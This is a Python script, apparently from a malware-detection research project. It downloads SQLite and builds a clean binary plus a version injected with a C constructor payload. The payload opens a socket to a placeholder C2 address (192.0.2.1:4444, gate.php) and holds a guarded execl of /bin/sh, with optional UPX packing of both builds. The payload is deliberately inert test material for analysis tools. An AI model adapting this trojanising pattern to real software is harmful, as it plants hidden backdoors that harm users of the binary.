#!/usr/bin/env python3
"""Build a real, large sample for S2/S3.

Downloads the SQLite amalgamation (public domain), builds:
  * sqlite_benign  — real code only
  * sqlite_inj     — same code + a harmless constructor payload
                     (C2 URL + socket/htons/inet_addr + guarded execl; never executed)

The payload is a *static* string and calls socket/execve, so Ghidra's IoC xref
and the Linux API priority should surface it even in a huge binary.

Usage:
    python3 experiments/build_real_sample.py
    python3 experiments/build_real_sample.py --pack upx
    python3 experiments/build_real_sample.py --zip /path/to/sqlite-amalgamation.zip
"""
from __future__ import annotations

import argparse
import hashlib
import os
import re
import shutil
import subprocess
import sys
import urllib.request
import zipfile

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.normpath(os.path.join(HERE, ".."))
REAL = os.path.join(ROOT, "samples", "real")
PAYLOAD_C = r'''#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

__attribute__((constructor)) static void crowbar_payload(void) {
    const char *u = "http://192.0.2.1:4444/gate.php";
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port = htons(4444);
    a.sin_addr.s_addr = inet_addr("192.0.2.1");
    if (getenv("CROWBAR_NEVER_SET") != NULL) {
        execl("/bin/sh", "sh", (char *)0);
    }
    printf("connecting to %s\n", u);
    (void)s;
}
'''


def sha256(path: str) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as fh:
        for chunk in iter(lambda: fh.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


def find_amalgamation(real_dir: str) -> str | None:
    for name in os.listdir(real_dir):
        path = os.path.join(real_dir, name)
        if os.path.isdir(path) and os.path.isfile(os.path.join(path, "sqlite3.c")):
            return path
    return None


def download(real_dir: str, zip_path: str | None) -> str:
    os.makedirs(real_dir, exist_ok=True)
    existing = find_amalgamation(real_dir)
    if existing:
        print(f"[real] amalgamation already present: {existing}")
        return existing

    if zip_path:
        archive = zip_path
    else:
        print("[real] finding the current amalgamation on sqlite.org ...")
        page = urllib.request.urlopen("https://www.sqlite.org/download.html", timeout=30).read().decode("utf-8", "replace")
        m = re.search(r"(20\d{2}/sqlite-amalgamation-\d+\.zip)", page)
        if not m:
            raise SystemExit("could not find an amalgamation link; pass --zip")
        url = "https://www.sqlite.org/" + m.group(1)
        archive = os.path.join(real_dir, os.path.basename(m.group(1)))
        print(f"[real] downloading {url}")
        urllib.request.urlretrieve(url, archive)

    with zipfile.ZipFile(archive) as zf:
        zf.extractall(real_dir)
    found = find_amalgamation(real_dir)
    if not found:
        raise SystemExit("amalgamation extracted but sqlite3.c was not found")
    print(f"[real] extracted: {found}")
    return found


def build(src_dir: str, out: str, extra: list[str] | None = None) -> bool:
    cmd = ["gcc", "-O0", "-w", "-o", out,
           os.path.join(src_dir, "sqlite3.c"),
           os.path.join(src_dir, "shell.c"),
           *(extra or []),
           "-lpthread", "-ldl", "-lm"]
    print("[real] " + " ".join(cmd[:4]) + " ...")
    proc = subprocess.run(cmd, capture_output=True, text=True)
    if proc.returncode != 0:
        print(proc.stderr[-800:])
        return False
    return True


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--zip", help="local sqlite-amalgamation zip (skip download)")
    ap.add_argument("--pack", choices=("none", "upx"), default="none")
    ap.add_argument("--skip-benign", action="store_true")
    args = ap.parse_args()

    src = download(REAL, args.zip)
    payload = os.path.join(REAL, "payload.c")
    with open(payload, "w", encoding="utf-8") as fh:
        fh.write(PAYLOAD_C)

    built = []
    if not args.skip_benign:
        benign = os.path.join(REAL, "sqlite_benign")
        if build(src, benign):
            built.append(benign)

    injected = os.path.join(REAL, "sqlite_inj")
    if build(src, injected, [payload]):
        built.append(injected)

    if args.pack == "upx":
        if shutil.which("upx") is None:
            print("[real] upx not found; skipping pack")
        else:
            for path in list(built):
                packed = path + ".upx"
                p = subprocess.run(["upx", "-9", "-o", packed, path],
                                   capture_output=True, text=True)
                if p.returncode == 0:
                    built.append(packed)
                else:
                    print(f"[real] upx failed for {path}: {p.stderr.strip()[:120]}")

    print("\n[real] built:")
    for path in built:
        print(f"  {path}  ({os.path.getsize(path)/1e6:.1f} MB, sha256={sha256(path)[:16]}...)")
    print("\nNext: run the pipeline with CROWBAR_MAX_DECOMPILE=100 and "
          "CROWBAR_GHIDRA_TIMEOUT=1200, then save the state JSON for scale_eval --from-state.")


if __name__ == "__main__":
    main()
